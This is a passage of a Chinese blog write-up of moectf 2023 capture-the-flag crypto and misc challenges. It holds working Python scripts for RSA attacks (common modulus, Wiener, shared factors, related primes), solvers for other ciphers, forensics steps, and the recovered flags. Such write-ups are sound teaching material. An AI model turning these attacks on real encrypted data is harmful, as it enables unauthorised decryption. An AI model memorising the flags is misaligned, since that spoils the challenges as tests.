class="hljs-number">18055722101348711626577381571859114850735298658417345663254295930584841136416234624852520581982069555948490061840244710773146585295336094872892685938420880462305333393436098181186277450475949236132458958671804132443554885896037342335902958516394876382378829317303693655605215373555988755516058130500801822723195474873517960624159417903134580987202400855946137101429970119186394052011747475879598126195607938106163892658285305921071673588966184054026228745012993740035399652049777986535759039077634555909031397541116025395236871778797949216479130412500655359057128438928721459688727543057760739527720641179290282309741</span><br><br><span class="hljs-attribute">q</span>=<span class="hljs-number">19024691283015651666032297670418553586155390575928421823630922553034857624430114628839720683172187406577114034710093054198921843669645736474448836706112221787749688565566635453151716934583685087745112614898780150391513798368931496744574075511968933800467288441832780919514199410584786925010518564670786685241724643282580795568609339268652910564215887176803735675069372979560024792322029911970574914829712553975379661212645059271137916107885326625543090473004683836665262304916304580076748336858662108554591235698235221618061328251985929904075811056422186525179189846420226944944513865790999242309352900287977666792901</span><br><br><span class="hljs-attribute">c1</span>=<span class="hljs-number">10004937130983861141937782436252502991050957330184611684406783226971057978666503675149401388381995491152372622456604317681236160071166819028679754762162125904637599991943368450200313304999566592294442696755822585022667008378021280392976010576970877334159755332946926433635584313137140987588847077645814987268595739733550220882135750267567373532603503399428451548677091911410732474324157868011686641243202218731844256789044721309478991918322850448456919991540932206923861653518190974620161055008847475600980152660468279765607319838003177639654115075183493029803981527882155542925959658123816315099271123470754815045214896642428657264709805029840253303446203030294879166242867850331945166255924821406218090304893024711068773287842075208409312312188560675094244318565148284432361706108491327014254387317744284876018328591380705408407853404828189643214087638328376675071962141118973835178054884474523241911240926274907256651801384433652425740230755811160476356172444327762497910600719286629420662696949923799255603628210458906831175806791599965316549386396788014703044837917283461862338269599464440202019922379625071512100821922879623930069349084917919100015782270736808388388006084027673781004085620817521378823838335749279055639005125</span><br><span class="hljs-attribute">e</span>=<span class="hljs-number">65537</span><br><br><span class="hljs-attribute">d1</span>=invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><span class="hljs-attribute">m1</span>=powmod(c1,d1,p*q)<br><span class="hljs-attribute">print</span>(long_to_bytes(m1))<br><span class="hljs-attribute">a</span>=[<span class="hljs-number">9949603102225364603</span>,<span class="hljs-number">10049235158029375571</span>,<span class="hljs-number">10547615587767500213</span>,<span class="hljs-number">10596280721192026229</span>,<span class="hljs-number">10864078180916418691</span>,<span class="hljs-number">11092420583960163379</span>,<span class="hljs-number">11853704782834170959</span>,<span class="hljs-number">12034779627328165471</span>,<span class="hljs-number">12404642343676224637</span>,<span class="hljs-number">12448177342966243757</span>,<span class="hljs-number">13062839684118954553</span>,<span class="hljs-number">13645878578452317313</span>,<span class="hljs-number">14397830993057803133</span>,<span class="hljs-number">14619040595108594017</span>,<span class="hljs-number">14678737767649343977</span>,<span class="hljs-number">14745811312384518031</span>,<span class="hljs-number">14813953870710226847</span>,<span class="hljs-number">15175734709842430433</span>,<span class="hljs-number">15211380502610462057</span>,<span class="hljs-number">15332916111580607077</span>,<span class="hljs-number">15751974537676958401</span>,<span class="hljs-number">16123604149048919099</span>,<span class="hljs-number">16408421615173973083</span>,<span class="hljs-number">16870346804576162551</span>,<span class="hljs-number">17093292308638969889</span>,<span class="hljs-number">17265001711647542137</span>,<span class="hljs-number">17289161209347211817</span>,<span class="hljs-number">17543713628803023199</span>,<span class="hljs-number">17673334943789572513</span>,<span class="hljs-number">18106525049998616747</span>,<span class="hljs-number">18345408081492711641</span>,<span class="hljs-number">18390046459144888243</span>]<br><span class="hljs-attribute">c2</span>=<span class="hljs-number">4948422459907576438725352912593232312182623872749480015295307088166392790756090961680588458629287353136729331282506869598853654959933189916541367579979613191505226006688017103736659670745715837820780269669982614187726024837483992949073998289744910800139692315475427811724840888983757813069849711652177078415791290894737059610056340691753379065563574279210755232749774749757141836708161854072798697882671844015773796030086898649043727563289757423417931359190238689436180953442515869613672008678717039516723747808793079592658069533269662834322438864456440701995249381880745586708718334052938634931936240736457181295</span><br><span class="hljs-attribute">n2</span>=<span class="hljs-number">8582505375542551134698364096640878629785534004976071646505285128223700755811329156276289439920192196962008222418309136528180402357612976316670896973298407081310073283979903409463559102445223030866575563539261326076167685019121804961393115251287057504682389257841337573435085535013992761172452417731887700665115563173984357419855481847035192853387338980937451843809282267888616833734087813693242841580644645315837196205981207827105545437201799441352173638172133698491126291396194764373021523547130703629001683366722885529834956411976212381935354905525700646776572036418453784898084635925476199878640087165680193737</span><br><span class="hljs-attribute">phi</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">32</span>):<br>    <span class="hljs-attribute">phi</span> *= a[i]-<span class="hljs-number">1</span><br><span class="hljs-attribute">d2</span>=invert(e,phi)<br><span class="hljs-attribute">m2</span>=powmod(c2,d2,n2)<br><span class="hljs-attribute">print</span>(long_to_bytes(m2))<br></code></pre></td></tr></table></figure><p>flag： </p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">moectf&#123;fACtord<span class="hljs-number">6</span>_A<span class="hljs-symbol">nd_YAfu_Are_6</span>oth_good_utils_to_fACtorize_<span class="hljs-symbol">num6</span>ers_ff<span class="hljs-number">90</span>S&#125;<br></code></pre></td></tr></table></figure><h3 id="feistel"><a href="#feistel" class="headerlink" title="feistel"></a><strong>feistel</strong></h3><p>​    将密文明文互换，再用加密脚本加密既可解密出flag</p><img src="/2024/04/29/moectf2023/clip_image022.png" class title="img"><h3 id="n-amp-n"><a href="#n-amp-n" class="headerlink" title="n&amp;n"></a><strong>n&amp;n</strong></h3><p>​    观察代码，得到e1，e2，c1，c2，n，故采用共模攻击</p><p>编写脚本得到flag</p><p>脚本：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br>e1 = 0x114514<br>e2 = 19198101<br><span class="hljs-attribute">c1</span>=5776799746376051463605370130675046329799612910435315968508603116759552095183027263116443417343895252766060748671845650457077393391989018107887540639775168897954484319381180406512474784571389477212123123540984850033695748142755414954158933345476509573211496722528388574841686164433315356667366007165419697987147258498693175698918104120849579763098045116744389310549687579302444264316133642674648294049526615350011916160649448726069001139749604430982881450187865197137222762758538645387391379108182515717949428258503254717940765994927802512049427407583200118969062778415073135339774546277230281966880715506688898978925<br>c2= 4664955020023583143415931782261983177552050757537222070347847639906354901601382630034645762990079537901659753823666851165175187728532569040809797389706253282757017586285211791297567893874606446000074515260509831946210526182765808878824360460569061258723122198792244018463880052389205906620425625708718545628429086424549277715280217165880900037900983008637302744555649467104208348070638137050458275362152816916837534704113775562356277110844168173111385779258263874552283927767924979691542028126412133709129601685315027689094437957165812994784648540588277901241854031439324974562449032290219652206466731675967045633360<br><span class="hljs-attribute">n</span>=13612969130810965900902742090064423006385890357159609755971027204203418808937093492927060428980020085273603754747223030702684866992231913349067578014240319426522039068836171388168087260774376277346092066880984406890296520951318296354893551565670293486797637522297989653182109744864444697818991039473180752980752117041574628063002176339235126861152739066489620021077091941250365101779354009854706729448088217051728432010328667839532327286559570597994183126402340332924370812383312664419874352306052467284992411543921858024469098268800500500651896608097346389396273293747664441553194179933758992070398387066135330851531<br><span class="hljs-attribute">s</span>=gcdext(e1,e2)<br><span class="hljs-attribute">s1</span>=s[1]<br><span class="hljs-attribute">s2</span>=s[2]<br><span class="hljs-attribute">m</span>=powmod(c1,s1,n)<br><span class="hljs-attribute">a</span>=powmod(c2,s2,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m<span class="hljs-number">*a</span>%n))<br></code></pre></td></tr></table></figure><p>flag:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;dO_nOt_u53_5AM3_MOdulu5_tO_3ncrYPt_dIFF3r3nt_dAtA!_JY63x33iiA0Ji&#125;</span><br></code></pre></td></tr></table></figure><h3 id="p-q"><a href="#p-q" class="headerlink" title="|p-q|"></a><strong>|p-q|</strong></h3><p>N分解得到p，q，编写rsa解题脚本，得flag</p><p>flag：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;it_iS_vUlnErablE_iF_p_iS_aboUt_thE_SaME_SiZE_aS_Q_MVoAYArrlG3uco&#125;</span><br></code></pre></td></tr></table></figure><h3 id="ez-chain"><a href="#ez-chain" class="headerlink" title="ez_chain"></a><strong>ez_chain</strong></h3><p>​    运用到辗转相除法、cbc加密，但是不知道key，通过构造相同位数的flag，发现flag内容怎么修改，最后的余数都不会变，猜测最后那一部分和moect{有关，修改查看，发现最后一个余数改变，确定猜测，该余数即为blocks[0]，同时已知密文、iv，异或求得key。</p><p>代码:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">a</span>=[<span class="hljs-number">8490961288</span>, <span class="hljs-number">122685644196</span>, <span class="hljs-number">349851982069</span>, <span class="hljs-number">319462619019</span>, <span class="hljs-number">74697733110</span>,<br>   <span class="hljs-attribute">43107579733</span>, <span class="hljs-number">465430019828</span>, <span class="hljs-number">178715374673</span>, <span class="hljs-number">425695308534</span>, <span class="hljs-number">164022852989</span>,<br>   <span class="hljs-attribute">435966065649</span>, <span class="hljs-number">222907886694</span>, <span class="hljs-number">420391941825</span>, <span class="hljs-number">173833246025</span>, <span class="hljs-number">329708930734</span>]<br><span class="hljs-attribute">iv</span> = <span class="hljs-number">3735927943</span><br><span class="hljs-attribute">base</span> = bytes_to_long(b<span class="hljs-string">&quot;koito&quot;</span>)<br><span class="hljs-attribute">key</span>=<span class="hljs-number">5329712293</span>^a[<span class="hljs-number">0</span>]^iv<br><span class="hljs-attribute">b</span>=[iv]<br><span class="hljs-attribute">for</span> i in range(len(a)-<span class="hljs-number">1</span>):<br>    <span class="hljs-attribute">b</span>.append(a[len(a)-<span class="hljs-number">2</span>-i]^a[len(a)-<span class="hljs-number">1</span>-i]^key)<br><span class="hljs-attribute">b</span>.append(a[<span class="hljs-number">0</span>]^b[<span class="hljs-number">0</span>]^key)<br><span class="hljs-attribute">a1</span>=list(reversed(b[<span class="hljs-number">1</span>:]))<br><span class="hljs-attribute">m</span>=a1[<span class="hljs-number">0</span>]<br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>,len(a1)):<br>    <span class="hljs-attribute">m</span> = base*m+a1[i]<br><span class="hljs-attribute">flag</span> = long_to_bytes(m)<br><span class="hljs-attribute">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="minipack"><a href="#minipack" class="headerlink" title="minipack"></a><strong>minipack</strong></h3><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br> key=[]<br> <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;E:\\key.txt&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fs:<br>   key1 = fs.read().split(<span class="hljs-string">&quot;,&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;[&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;]&#x27;</span>)<br> key1[<span class="hljs-number">0</span>]=key1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>:]<br> key1[-<span class="hljs-number">1</span>]=key1[-<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>]<br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key1:<br>   key.append(<span class="hljs-built_in">int</span>(i))<br> key = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">reversed</span>(key))<br> <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;E:\\ciphertext.txt&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fs:<br>   cip = <span class="hljs-built_in">int</span>(fs.read())<br> m = <span class="hljs-string">&#x27;&#x27;</span><br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>   <span class="hljs-keyword">if</span> cip - key[i] &gt;= <span class="hljs-number">0</span>:<br>     cip = cip - key[i]<br>     m += <span class="hljs-string">&#x27;1&#x27;</span><br>   <span class="hljs-keyword">else</span>:<br>     m += <span class="hljs-string">&#x27;0&#x27;</span><br> <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m[::-<span class="hljs-number">1</span>],<span class="hljs-number">2</span>)))<br></code></pre></td></tr></table></figure><h3 id="giant-e"><a href="#giant-e" class="headerlink" title="giant_e"></a><strong>giant_e</strong></h3><p>​    rsa解题，e特别大，采用winerer攻击</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ContinuedFraction</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,numerator,denumerator</span>):<br>        self.numberlist = [] <span class="hljs-comment"># number in continued fraction</span><br>        self.fractionlist = [] <span class="hljs-comment"># the near fraction list</span><br>        self.GenerateNumberList (numerator, denumerator)<br>        self.GenerateFractionList ()<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GenerateNumberList</span> (self, numerator, denumerator):<br>        <span class="hljs-keyword">while</span> numerator != <span class="hljs-number">1</span>:<br>            quotient = numerator // denumerator<br>            remainder = numerator % denumerator<br>            self.numberlist.append (quotient)<br>            numerator = denumerator<br>            denumerator = remainder<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GenerateFractionList</span> (self) :<br>        self.fractionlist.append ([self.numberlist[<span class="hljs-number">0</span>], <span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span> (self.numberlist)):<br>            numerator = self.numberlist[i]<br>            denumerator = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (i) :<br>                temp = numerator<br>                numerator = denumerator + numerator * self.numberlist[i-j-<span class="hljs-number">1</span>]<br>                denumerator = temp<br>            self.fractionlist.append([numerator, denumerator])<br><br>e = <span class="hljs-number">0x609778981bfbb26bb93398cb6d96984616a6ab08ade090c1c0d4fedb00f44f0552a1555efec5cc66e7960b61e94e80e7483b9f906a6c8155a91cdc3e4917fa5347c58a2bc85bb160fcf7fe98e3645cfea8458ea209e565e4eb72ee7cbb232331a862d8a84d91a0ff6d74aa3c779b2b129c3d8148b090c4193234764f2e5d9b2170a9b4859501d07c0601cdd18616a0ab2cf713a7c785fd06f27d68dff24446d884644e08f31bd37ecf48750e4324f959a8d37c5bef25e1580851646d57b3d4f525bc04c7ddafdf146539a84703df2161a0da7a368675f473065d2cb661907d990ba4a8451b15e054bfc4dd73e134f3bf7d8fa4716125d8e21f946d16b7b0fc43</span><br>n=<span class="hljs-number">0xbaa70ba4c29eb1e6bb3458827540fce84d40e1c966db73c0a39e4f9f40e975c42e02971dab385be27bd2b0687e2476894845cc46e55d9747a5be5ca9d925931ca82b0489e39724ea814800eb3c0ea40d89ebe7fe377f8d3f431a68d209e7a149851c06a4e67db7c99fcfd9ec19496f29d59bb186feb44a36fe344f11d047b9435a1c47fa2f8ed72f59403ebb0e439738fd550a7684247ab7da64311690f461e6dce03bf2fcd55345948a3b537087f07cd680d7461d326690bf21e39dff30268cb33f86eeceff412cd63a38f7110805d337dcad25e6f7e3728b53ca722b695b0d9db37361b5b63213af50dd69ee8b3cf2085f845d7932c08b27bf638e98497239</span><br>c=<span class="hljs-number">0x45a9ce4297c8afee693d3cce2525d3399c5251061ddd2462513a57f0fd69bdc74b71b519d3a2c23209d74fcfbcb6b196b5943838c2441cb34496c96e0f9fc9f0f80a2f6d5b49f220cb3e78e36a4a66595aa2dbe3ff6e814d84f07cb5442e2d5d08d08aa9ccde0294b39bfde79a6c6dcd2329e9820744c4deb34a039da7933ddf00b0a0469afb89cba87490a39783a9b2f8f0274f646ca242e78a326dda886c213bc8d03ac1a9150de4ba08c5936c3fe924c8646652ef85aa7ac0103485f472413427a0e9d9a4d416b99e24861ca8499500c693d7a07360158ffffa543480758cafff2a09a9f6628f92767764fa026d48a9dd899838505ae16e38910697f9de14</span><br>a = ContinuedFraction(e,n)<br><span class="hljs-keyword">for</span> k,d <span class="hljs-keyword">in</span> a.fractionlist:<br>    s = long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, n))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(s.decode())<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;too_larGe_exponent_is_not_a_iDea_too!_Bung92WPIBung92WPIBung9?WP&#125;<br></code></pre></td></tr></table></figure><h3 id="rsa-signin"><a href="#rsa-signin" class="headerlink" title="rsa_signin"></a><strong>rsa_signin</strong></h3><p>​    出现多组c，n，可以考虑低加密指数广播攻击，但e=65337，比较大，不使用中国剩余定理，考虑在n_list找最大公因数，编写脚本得flag</p><p>脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>e = <span class="hljs-number">65537</span><br>n1 =<br>…<br>n11 =<br>c1 =<br>…<br>c11 =<br>c = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]<br>n = [n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, n11]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n)):<br>        <span class="hljs-keyword">if</span> (i != j):<br>            <span class="hljs-keyword">if</span> (gmpy2.gcd(n[i], n[j]) != <span class="hljs-number">1</span>):  <span class="hljs-comment"># 对不同的n进行 欧几里得算法，以求出最大公约数(p)</span><br>                <span class="hljs-built_in">print</span>(i, j)  <span class="hljs-comment"># 输出对应的n的序号</span><br>                p = gmpy2.gcd(n[i], n[j])<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p = &quot;</span>, p)<br>                q = n[i] // p<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q = &quot;</span>, q)<br>                d = gmpy2.invert(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d = &quot;</span>, d)<br>                m = <span class="hljs-built_in">pow</span>(c[i], d, n[i])<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;m = &quot;</span>, m)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br></code></pre></td></tr></table></figure><p>flag:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">moectf&#123;<span class="hljs-symbol">it_is_re@</span><span class="hljs-symbol">lly_@</span><span class="hljs-symbol">_signin_level_cryPto_ch@</span><span class="hljs-symbol">ll@</span>nge_ng92WPIBung92WPIBun&#125;<br></code></pre></td></tr></table></figure><h3 id="factorize-me"><a href="#factorize-me" class="headerlink" title="factorize_me!"></a><strong>factorize_me!</strong></h3><p>​    无法直接分解n，观察代码，发现n是由prime2累乘得到，而prime2可以由prime得到，而prime累乘数已经告知，尝试分解，得到al数组，编写脚本</p><p>脚本：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros">al=[6811480804433459752827714558479851837166061762294131563310130325846430072816177165149613687307165209577130630311477665591141650399740741396784593477667511,<br>6991223361118904775931217829045348785013077549030883418924453538830605687999480005714979700653172534877541317997174968789510984315425270755055110913347281,<br>7592439908930473591169395506464664967460880934907692099467559610659035874008829133810341129161864445676397227262130671224157308868678442281617413952593477,<br>7661276973316857207751367277881032536449069939447322837508906694964933673171693624171780997296797446643574508184011878230465391879808258241752897792891323,<br>8752762682421281693932454897190422008900505775990831144558827755415243453970083322530846132571648469860763497724505255094464743633789884168771246977571539,<br>9987009117206906203158749743824168660291275882852229158070368815160479543708376165641735042845357978292384303332559592302507789120810447986634662721490507,<br>10022455487144667211701100343824680124338467215246658405697280466931561838565228778624923751405642974058833143888323468902504576610147119708725877528011439,<br>11627877395179828773706504422918933052041685770731872812302758181943244472706231518350716590168708806854971155512042158777017234038219076771501368374236727,<br>12876877424944854147075816504195994138450356002779004886384584287813869165469217718717854027672044903401715370348223932937626725119320180795716270261309139]<br><span class="hljs-attribute">n</span>=899081756851564072995842371038848265712822308942406479625157544735473115850983700580364485532298999127834142923262920189902691972009898741820291331257478170998867183390650298055916005944577877856728843264502218692432679062445730259562784479410120575777748292393321588239071577384218317338474855507210816917917699500763270490789679076190405915250953860114858086078092945282693720016414837231157788381144668395364877545151382171251673050910143023561541226464220441<br>e = 65537<br>c = 841335863342518623856757469220437045493934999201203757845757404101093751603513457430254875658199946020695655428637035628085973393246970440054477600379027466651143466332405520374224855994531411584946074861018245519106776529260649700756908093025092104292223745612991818151040610497258923925952531383407297026038305824754456660932812929344928080812670596607694776017112795053283695891798940700646874515366341575417161087304105309794441077774052357656529143940010140<br><br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br><br><span class="hljs-keyword">from</span> Crypto.Util.number import getPrime<br><span class="hljs-keyword">from</span> math import prod<br><span class="hljs-keyword">from</span> sympy import nextprime<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(9):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(9):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> range(9):<br>            <span class="hljs-attribute">q</span>=nextprime(al[i])<br>            <span class="hljs-attribute">w</span>=nextprime(al[j])<br>            <span class="hljs-attribute">r</span>=nextprime(al[k])<br>            <span class="hljs-attribute">z</span>=q*w*r<br>            <span class="hljs-keyword">if</span>(<span class="hljs-attribute">n</span>==z):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q=&quot;</span>,q)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;r=&quot;</span>,r)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;w=&quot;</span>,w)<br>                phi=(q-1)*(w-1)*(r-1)<br>                <span class="hljs-attribute">d</span>=invert(e,phi)<br>                <span class="hljs-attribute">m</span>=powmod(c,d,n)<br>                <span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>​       </p><p>flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;you_KNow_how_to_faCtorize_N_right?_9?WPIBung6?WPIBung6?WPIBund6?&#125;<br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h1><h3 id="Misc-入门指北"><a href="#Misc-入门指北" class="headerlink" title="Misc 入门指北"></a><strong>Misc</strong> <strong>入门指北</strong></h3><p>​    Base64解密</p><p>flag：moectf{h@v3_fun_@t_m15c_!}</p><h3 id="打不开的图片1"><a href="#打不开的图片1" class="headerlink" title="打不开的图片1"></a><strong>打不开的图片1</strong></h3><p>用010editor打开，发现是jpg格式文件，修复文件头，可以打开，有exif信息，16进制转换得flag</p><p>Flag：moectf{XDU_i5_v3ry_6e@u2ifu1}</p><h3 id="打不开的图片2"><a href="#打不开的图片2" class="headerlink" title="打不开的图片2"></a><strong>打不开的图片2</strong></h3><p>​    用010editor打开，发现ihdr，查看文件尾，为png文件尾，修复文件头，成功打开图片得到flag</p><img src="/2024/04/29/moectf2023/clip_image024.jpg" class title="img"><h3 id="狗子-1-普通的猫"><a href="#狗子-1-普通的猫" class="headerlink" title="狗子(1) 普通的猫"></a><strong>狗子(1) 普通的猫</strong></h3><p>​    用010editor打开,文件尾部找到flag</p><p>Flag: </p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;eeeez_f1ag_as_<span class="hljs-built_in">A_G1ft</span>!&#125;<br></code></pre></td></tr></table></figure><h3 id="building-near-lake"><a href="#building-near-lake" class="headerlink" title="building_near_lake"></a><strong>building_near_lake</strong></h3><p>​    下载图片可以查询到拍摄信息，照相机制造商为Xiaomi，型号为22122RK93C，搜素发现是红米k60，搜索发布会时间，得到20221227，百度识图发现拍摄地点是厦门大学翔安德望图书馆，地图查询经纬度，得到flag</p><img src="/2024/04/29/moectf2023/clip_image026.png" class title="img"><h3 id="烫烫烫"><a href="#烫烫烫" class="headerlink" title="烫烫烫"></a><strong>烫烫烫</strong></h3><p>​    转储utf-7，正常显示，</p><img src="/2024/04/29/moectf2023/clip_image028.png" class title="img"><p>计算key——b34edc782d68fda34dc2332967273b0f0900a0ebd0dcec48467851bc6117bad1，进行aes计算，得flag</p><p>Flag：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">moectf&#123;<span class="hljs-symbol">codep@</span><span class="hljs-symbol">ge_pl@</span><span class="hljs-symbol">ys_@</span><span class="hljs-symbol">n_iMport@</span><span 